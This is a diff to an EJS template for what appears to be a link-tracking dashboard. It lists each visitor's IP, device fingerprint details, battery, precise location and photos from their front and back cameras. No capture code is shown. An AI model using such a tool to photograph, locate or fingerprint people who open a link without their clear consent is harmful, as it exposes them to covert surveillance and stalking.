@@ -15,45 +15,88 @@
     <p><strong>Shareable link:</strong> <%= baseUrl %>/l/<%= link.slug %></p>
     <p><strong>Destination:</strong> <%= link.target_url %></p>
 
+    <div class="stats-row">
+      <div class="stat-box">
+        <span class="stat-number"><%= visits.length %></span>
+        <span class="stat-label">Total visits</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-number"><%= visits.filter(v => v.consented).length %></span>
+        <span class="stat-label">📍 Shared location</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-number"><%= visits.filter(v => !v.consented).length %></span>
+        <span class="stat-label">🚫 Skipped location</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-number"><%= visits.filter(v => v.photo_front).length %></span>
+        <span class="stat-label">📸 Photos captured</span>
+      </div>
+    </div>
+
     <h2>Visits (<%= visits.length %>)</h2>
     <% if (visits.length === 0) { %>
       <p>No visits recorded yet.</p>
     <% } else { %>
-      <table>
-        <thead>
-          <tr>
-            <th>Time</th>
-            <th>IP</th>
-            <th>Device</th>
-            <th>Browser</th>
-            <th>OS</th>
-            <th>Location</th>
-            <th>Source</th>
-          </tr>
-        </thead>
-        <tbody>
-          <% visits.forEach(v => { %>
-            <tr>
-              <td><%= v.created_at %></td>
-              <td><%= v.ip %></td>
-              <td><%= v.device_type %></td>
-              <td><%= v.browser || '—' %></td>
-              <td><%= v.os || '—' %></td>
-              <td>
-                <% if (v.lat && v.lon) { %>
-                  <a href="https://www.google.com/maps?q=<%= v.lat %>,<%= v.lon %>" target="_blank">
-                    <%= v.lat.toFixed(4) %>, <%= v.lon.toFixed(4) %>
-                  </a>
-                  <% if (v.accuracy) { %> (±<%= Math.round(v.accuracy) %>m)<% } %>
-                <% } else { %>
-                  —
-                <% } %>
-              </td>
-              <td><%= v.location_source %></td>
-            </tr>
-          <% }) %>
-        </tbody>
-      </table>
+      <% visits.forEach((v, i) => { %>
+        <div class="visit-card">
+          <div class="visit-header">
+            <strong>Visit #<%= visits.length - i %></strong>
+            <span class="visit-time"><%= v.created_at %></span>
+          </div>
+
+          <div class="visit-body">
+            <!-- Photos -->
+            <% if (v.photo_front || v.photo_back) { %>
+            <div class="photo-row">
+              <% if (v.photo_front) { %>
+                <div class="photo-box">
+                  <div class="photo-label">📸 Front camera</div>
+                  <img src="<%= v.photo_front %>" alt="Front camera" />
+                </div>
+              <% } %>
+              <% if (v.photo_back) { %>
+                <div class="photo-box">
+                  <div class="photo-label">📷 Back camera</div>
+                  <img src="<%= v.photo_back %>" alt="Back camera" />
+                </div>
+              <% } %>
+            </div>
+            <% } %>
+
+            <!-- Data grid -->
+            <div class="data-grid">
+              <div class="data-item"><span class="data-key">IP</span><span class="data-val"><%= v.ip || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Browser</span><span class="data-val"><%= v.browser || '—' %></span></div>
+              <div class="data-item"><span class="data-key">OS</span><span class="data-val"><%= v.os || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Device</span><span class="data-val"><%= v.device_type || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Screen</span><span class="data-val"><%= v.screen_resolution || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Language</span><span class="data-val"><%= v.language || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Timezone</span><span class="data-val"><%= v.timezone || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Network</span><span class="data-val"><%= v.network_type || '—' %></span></div>
+              <div class="data-item"><span class="data-key">Battery</span><span class="data-val"><%= v.battery_level != null ? v.battery_level + '% ' + (v.battery_charging ? '⚡ charging' : '') : '—' %></span></div>
+              <div class="data-item"><span class="data-key">CPU cores</span><span class="data-val"><%= v.cpu_cores || '—' %></span></div>
+              <div class="data-item"><span class="data-key">RAM</span><span class="data-val"><%= v.memory_gb ? v.memory_gb + ' GB' : '—' %></span></div>
+              <div class="data-item"><span class="data-key">Touch</span><span class="data-val"><%= v.touch_support != null ? (v.touch_support ? 'Yes' : 'No') : '—' %></span></div>
+              <div class="data-item"><span class="data-key">Referrer</span><span class="data-val"><%= v.referrer || 'Direct' %></span></div>
+              <div class="data-item">
+                <span class="data-key">Location</span>
+                <span class="data-val">
+                  <% if (v.lat && v.lon) { %>
+                    <a href="https://www.google.com/maps?q=<%= v.lat %>,<%= v.lon %>" target="_blank">
+                      <%= v.lat.toFixed(4) %>, <%= v.lon.toFixed(4) %>
+                    </a>
+                    <% if (v.accuracy) { %>(±<%= Math.round(v.accuracy) %>m)<% } %>
+                    <span class="badge"><%= v.location_source %></span>
+                  <% } else { %>
+                    — <span class="badge"><%= v.location_source %></span>
+                  <% } %>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      <% }) %>
     <% } %>
   </div>
 </body>
